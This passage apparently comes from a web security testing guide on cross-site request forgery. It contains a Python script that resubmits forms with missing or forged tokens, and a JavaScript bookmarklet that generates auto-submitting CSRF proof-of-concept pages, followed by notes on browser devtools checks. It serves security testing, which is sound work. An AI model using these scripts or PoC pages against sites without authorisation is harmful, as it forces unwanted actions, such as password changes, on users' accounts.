      def test_csrf_protection(target_url, login_url, username, password):
          # Create two separate sessions
          session1 = requests.Session()
          session2 = requests.Session()
          
          # Login with both sessions
          login_data = {'username': username, 'password': password}
          session1.post(login_url, data=login_data)
          session2.post(login_url, data=login_data)
          
          # Get form from session1
          response1 = session1.get(target_url)
          soup = BeautifulSoup(response1.text, 'html.parser')
          form = soup.find('form')
          
          # Extract form details
          form_action = form.get('action')
          form_method = form.get('method', 'get').lower()
          form_data = {}
          
          # Get all form inputs
          for input_field in form.find_all('input'):
              name = input_field.get('name')
              value = input_field.get('value', '')
              if name:
                  form_data[name] = value
          
          # Try to submit form data from session2 (without valid CSRF token)
          csrf_field = None
          for field_name in form_data.keys():
              if 'csrf' in field_name.lower() or 'token' in field_name.lower():
                  csrf_field = field_name
                  break
          
          if csrf_field:
              # Note the original token
              original_token = form_data[csrf_field]
              
              # Test case 1: Remove token
              test_data = form_data.copy()
              del test_data[csrf_field]
              
              # Test case 2: Empty token
              test_data2 = form_data.copy()
              test_data2[csrf_field] = ''
              
              # Test case 3: Invalid token
              test_data3 = form_data.copy()
              test_data3[csrf_field] = 'invalid-token-value'
              
              # Run tests
              test_cases = [
                  ("No token", test_data),
                  ("Empty token", test_data2),
                  ("Invalid token", test_data3)
              ]
              
              for test_name, test_data in test_cases:
                  if form_method == 'post':
                      response = session2.post(form_action, data=test_data)
                  else:
                      response = session2.get(form_action, params=test_data)
                  
                  # Check if request was successful
                  if response.status_code == 200 and 'success' in response.text.lower():
                      print(f"VULNERABLE: {test_name} - Request succeeded without valid CSRF token")
                  else:
                      print(f"SECURE: {test_name} - Request blocked as expected")
          
          else:
              print("WARNING: No CSRF token found in form. Application might be vulnerable.")
              
              # Try to submit the form with session2
              if form_method == 'post':
                  response = session2.post(form_action, data=form_data)
              else:
                  response = session2.get(form_action, params=form_data)
              
              if response.status_code == 200 and 'success' in response.text.lower():
                  print("VULNERABLE: Form submission successful without CSRF protection")
              else:
                  print("POTENTIALLY SECURE: Form submission failed, might use other protection mechanisms")
      
      # Usage example
      test_csrf_protection(
          'https://example.com/change-password',
          'https://example.com/login',
          'testuser',
          'password123'
      )
      ```
    - JavaScript browser-based testing:
      ```javascript
      // Save as browser bookmark and click when logged in to test site
      javascript:(function(){
        console.log("[CSRF Tester] Starting tests...");
        
        // Find all forms
        const forms = Array.from(document.querySelectorAll('form'));
        console.log(`[CSRF Tester] Found ${forms.length} forms`);
        
        forms.forEach((form, index) => {
          console.log(`[CSRF Tester] Analyzing form #${index + 1}:`);
          console.log(`[CSRF Tester] Action: ${form.action}`);
          console.log(`[CSRF Tester] Method: ${form.method}`);
          
          // Look for CSRF tokens
          const inputs = Array.from(form.querySelectorAll('input'));
          const csrfInputs = inputs.filter(input => 
            input.name && (
              input.name.toLowerCase().includes('csrf') || 
              input.name.toLowerCase().includes('token')
            )
          );
          
          if (csrfInputs.length === 0) {
            console.warn(`[CSRF Tester] WARNING: No CSRF token found in form #${index + 1}`);
            // Generate PoC
            generatePoC(form);
          } else {
            console.log(`[CSRF Tester] Found ${csrfInputs.length} potential CSRF tokens:`);
            csrfInputs.forEach(input => {
              console.log(`[CSRF Tester]   - ${input.name}: ${input.value}`);
            });
          }
        });
        
        function generatePoC(form) {
          const inputs = Array.from(form.querySelectorAll('input')).filter(i => i.name);
          let html = `<html>\n<body>\n<form id="csrf-form" action="${form.action}" method="${form.method || 'get'}">\n`;
          
          inputs.forEach(input => {
            if (input.type !== 'submit' && input.type !== 'button') {
              html += `  <input type="hidden" name="${input.name}" value="${input.value || ''}">\n`;
            }
          });
          
          html += `</form>\n<script>\ndocument.getElementById("csrf-form").submit();\n</script>\n</body>\n</html>`;
          
          console.log("[CSRF Tester] Generated PoC:");
          console.log(html);
        }
      })();
      ```

  - **Browser devtools for CSRF testing**
    - Network monitor for token analysis:
      - Inspect request/response headers
      - Monitor cookie attributes
      - Track token generation and usage
    - Application tab for cookie inspection:
      - Review SameSite attributes
      - Check HttpOnly and Secure flags
      - Test cookie manipulation
    - Console for debugging and testing:
      - JavaScript token analysis
      - Cross-origin request testing
      - Form manipulation and submission
